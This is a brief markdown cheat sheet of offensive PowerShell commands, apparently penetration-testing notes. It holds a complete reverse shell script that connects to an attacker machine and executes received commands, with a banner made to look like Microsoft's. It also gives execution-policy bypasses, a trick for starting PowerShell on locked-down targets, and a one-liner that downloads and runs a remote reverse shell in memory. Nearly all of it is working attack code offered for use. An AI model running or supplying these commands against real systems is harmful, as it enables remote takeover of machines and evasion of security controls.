# PowerShell useful commands

## credentials

```powershell
$user = 'TESTLAB\dfm.a'
$pwd = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pwd)
```

## shell

revshell.ps1

```powershell
$c = New-Object System.Net.Sockets.TCPClient("<KALI IP>","4444");
$I = $c.GetStream();[byte[]]$U = 0..(2-shl15)|%{0};
$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n");
$I.Write($U,0,$U.Length); $U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>'); $I.Write($U,0,$U.Length);
while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
$a = (iex $D 2>&1 | Out-String ); $r  = $a + (pwd).Path + '> '; $m = ([text.encoding]::ASCII).GetBytes($r);
$I.Write($m,0,$m.Length); $I.Flush()}; $c.Close();
```

Execution Policy

```powershell
Get-ExecutionPolicy
Set-ExecutionPolicy unrestricted
```

Exec file

```powershell
powershell.exe -noprofile -executionpolicy bypass -File revshell.ps1
```

Powershell startup on locked targets

- create `.txt` file with the following content and rename file to `.cmd` or `.bat`

```powershell
powershell.exe -noprofile -executionpolicy bypass
```

Execute download direct on memory

```powershell
cd /opt/nishang/Shells/
sudo python -m http.server 80
```

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<Kali IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

## Links

[PowerShell-Reverse-Shells](https://github.com/0x10F8/PowerShell-Reverse-Shells)
[PowerShell - no profile & execution policy](https://superuser.com/a/533745)
